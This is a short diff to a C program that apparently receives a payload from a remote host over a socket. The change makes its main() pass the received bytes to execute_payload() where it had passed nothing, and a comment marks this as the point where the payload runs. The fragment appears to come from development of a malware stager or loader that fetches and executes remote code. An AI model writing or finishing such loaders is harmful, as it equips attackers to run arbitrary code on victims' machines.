@@ -216,7 +216,7 @@ int main(void)
 	printf("[i] Received %zu bytes from remote host.\n", payload_size);
 
 	// Here we are printing, but later on this is where the payload will be executed
-	int result = execute_payload(NULL, 0);
+	int result = execute_payload(payload, payload_size);
 
 	free(payload);
 	cleanup(server_socket);
